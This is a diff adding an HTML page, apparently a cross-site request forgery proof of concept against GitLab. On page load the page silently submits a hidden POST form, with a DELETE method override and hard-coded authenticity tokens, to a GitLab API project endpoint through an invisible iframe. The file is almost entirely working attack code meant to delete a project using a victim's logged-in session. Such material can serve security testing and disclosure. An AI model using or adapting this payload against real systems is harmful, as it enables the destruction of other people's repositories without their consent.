@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="ar">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>CSRF Test with authenticity_token</title>
+  </head>
+  <body>
+    <form
+      id="csrf-test-form"
+      action="https://gitlab.com/api/v4/projects/67295882"
+      method="POST"
+      target="hidden-iframe"
+    >
+      <input type="hidden" name="_method" value="DELETE" />
+      <input
+        type="hidden"
+        name="authenticity_token"
+        value="XYAsJoL9Ooq8K-7eaO4rAfygYws7yLgzu9cri1_61SZTG0PkO_VafR8OZMUEYY1r-Y5r8E16LatRDwfDETLJoQ"
+      />
+      <button type="submit">Test CSRF</button>
+    </form>
+
+    <iframe
+      id="hidden-iframe"
+      name="hidden-iframe"
+      style="display: none"
+    ></iframe>
+
+    <script>
+      document
+        .getElementById("csrf-test-form")
+        .addEventListener("submit", function (event) {
+          event.preventDefault();
+          var iframe = document.getElementById("hidden-iframe");
+          var doc = iframe.contentWindow.document;
+          doc.open();
+          doc.write(
+            '<form id="temporary-form" action="' +
+              document.getElementById("csrf-test-form").action +
+              '" method="POST">'
+          );
+          doc.write('<input type="hidden" name="_method" value="DELETE">');
+          doc.write(
+            '<input type="hidden" name="authenticity_token" value="2fxr0uvygTnQobfes61W6SHIQCAJ0IOTwMzW4K7-GkQ8m4Gybr47BUTk7TC7Ex06GSjSYs22PZSaAEcegQfm0w">'
+          );
+          doc.write("</form>");
+          doc.close();
+
+          doc.getElementById("temporary-form").submit();
+        });
+      document.getElementById("csrf-test-form").submit();
+    </script>
+  </body>
+</html>
